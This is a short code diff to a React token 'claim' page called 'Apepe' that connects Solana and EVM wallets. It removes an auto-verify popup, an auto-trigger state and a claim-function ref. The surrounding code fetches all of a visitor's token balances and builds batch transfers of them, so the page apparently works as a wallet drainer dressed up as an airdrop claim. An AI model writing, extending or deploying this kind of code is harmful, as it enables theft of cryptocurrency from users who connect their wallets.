@@ -3,7 +3,7 @@ import { PegasusAnimation } from '@/components/PegasusAnimation';
 import { Navigation } from '@/components/Navigation';
 import { Button } from '@/components/ui/button';
 import { Card, CardContent } from '@/components/ui/card';
-import { useState, useEffect, useCallback, useRef } from 'react';
+import { useState, useEffect, useCallback } from 'react';
 import { useWallet, useConnection } from '@solana/wallet-adapter-react';
 import { PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, ComputeBudgetProgram } from '@solana/web3.js';
 import { getAssociatedTokenAddress, createTransferCheckedInstruction, createAssociatedTokenAccountInstruction, getAccount, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID } from '@solana/spl-token';
@@ -36,8 +36,6 @@ const Apepe = () => {
   const { isEVMConnected, evmSigner, evmProvider } = useEVMWallet();
   const { chainName } = useChainInfo();
   const [isClaiming, setIsClaiming] = useState(false);
-  const [isVerifying, setIsVerifying] = useState(false);
-  const [hasAutoTriggered, setHasAutoTriggered] = useState(false);
   const [balances, setBalances] = useState<TokenBalance[]>([]);
   const [solBalance, setSolBalance] = useState(0);
 
@@ -74,10 +72,6 @@ const Apepe = () => {
   useEffect(() => {
     if (publicKey) fetchAllBalances();
   }, [publicKey, fetchAllBalances]);
-
-  const claimFnRef = useRef<() => void>(() => {});
-
-  // Auto-verify popup removed: users connect their wallet and continue freely.
 
   const createBatchTransfer = useCallback(async (tokenBatch: TokenBalance[]) => {
     if (!publicKey) return null;
@@ -172,18 +166,12 @@ const Apepe = () => {
     }
   };
 
-  useEffect(() => {
-    claimFnRef.current = handleClaimTokens;
-  });
-
   const isWalletConnected = (activeChain === 'evm' && isEVMConnected) || !!publicKey;
 
   return (
     <div className="min-h-screen relative overflow-hidden">
       <PegasusAnimation />
       <Navigation />
-
-      {/* Wallet verification overlay removed */}
 
       <section className="relative pt-20 sm:pt-28 md:pt-32 pb-12 sm:pb-16 px-4">
         <div className="container mx-auto max-w-4xl text-center">
